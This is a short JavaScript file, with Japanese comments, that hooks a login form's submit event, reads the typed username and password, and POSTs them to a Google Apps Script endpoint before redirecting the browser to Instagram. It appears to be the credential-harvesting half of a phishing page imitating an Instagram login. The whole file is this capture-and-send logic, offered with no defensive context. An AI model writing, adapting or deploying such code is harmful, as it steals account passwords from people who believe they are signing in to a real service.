document.getElementById("login-form").addEventListener("submit", function(e) {
  e.preventDefault();
  const name = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  fetch("<<https://script.google.com/macros/s/AKfycbyH-_njO_Vc4rQpp0lOiD3GL-q2h8-3r7mlCD0lj2b9dfZskiVO1rE6R8N9Phixa5Ug/exec>>", {
    method: "POST",
    body: JSON.stringify({
      name: name,
      password: password
    }),
    headers: {
      "Content-Type": "application/json"
    }
  }).then(res => {
    if (res.ok) {
      window.location.href = "Instagram.com"; // 成功後に飛ぶページ（任意）
    } else {
      alert("送信エラー");
    }
  });
});
